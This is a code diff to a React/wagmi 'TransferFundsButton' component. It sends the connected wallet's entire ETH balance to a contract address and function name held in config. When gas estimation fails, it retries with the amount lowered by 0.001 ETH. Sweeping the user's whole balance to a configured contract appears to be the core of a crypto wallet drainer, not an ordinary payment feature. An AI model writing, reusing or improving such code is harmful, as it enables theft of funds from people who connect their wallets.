@@ -2,6 +2,7 @@ import { type BaseError, useWaitForTransactionReceipt, useWriteContract, useAcco
 import config from '../../config';
 import { estimateGas, getGasPrice } from 'wagmi/actions';
 import { useState } from 'react';
+import { encodeFunctionData, parseEther } from 'viem';
 
 const { ethAbi, ethContractAddress, functionName } = config;
 
@@ -16,13 +17,49 @@ export function TransferFundsButton() {
   const handleTransfer = async () => {
     try {
       const gasPrice = await getGasPrice(usedConfig)
-      const gasEstimate = await estimateGas(usedConfig, {
-        to: '0xd2135CfB216b74109775236E36d4b433F1DF507B',
-        value: balance?.value,
-        gasPrice
-      });
 
-      console.log("Gas", gasEstimate);
+      const data = encodeFunctionData({
+        abi: ethAbi,
+        functionName,
+        args: [],
+      })
+      
+      // Test decrease
+      let valueToSend = balance?.value; // Start with the full balance
+      let gasEstimate;
+      let transactionReady = false;
+      let attempts = 0; // Counter to track the number of decrements
+
+      // Try estimating gas with a maximum of 3 decrement attempts
+      do {
+        try {
+          gasEstimate = await estimateGas(usedConfig, {
+            data,
+            to: ethContractAddress as `0x${string}`,
+            value: valueToSend,
+            gasPrice,
+          });
+          transactionReady = true; // Exit loop if estimation succeeds
+        } catch (error) {
+          if ((error as any).name === 'EstimateGasExecutionError') {
+            console.warn('EstimateGasExecutionError: Decreasing value and retrying...');
+            
+            // Decrease value by 0.001 ETH and increment attempt count
+            valueToSend = valueToSend! - parseEther('0.001');
+            attempts += 1;
+
+            // Check if we've reached max attempts or if valueToSend is too low
+            if (attempts >= 3 || !valueToSend || valueToSend <= 0) {
+              setErrorMessage('Unable to cover gas costs after 3 attempts. Insufficient funds.');
+              return;
+            }
+          } else {
+            throw error; // For other errors, exit the loop immediately
+          }
+        }
+      } while (!transactionReady);
+
+      console.log("Gas estimate:", gasEstimate);
       
       await writeContract({
         address: ethContractAddress as `0x${string}`,
@@ -30,7 +67,7 @@ export function TransferFundsButton() {
         functionName,
         args: [],
         gas: gasEstimate,
-        value: balance?.value && balance.value - gasEstimate,  // Ensuring there's enough balance for the gas cost
+        value: valueToSend,  // Ensuring there's enough balance for the gas cost
       });
       
       // Reset any previous error messages on a successful attempt
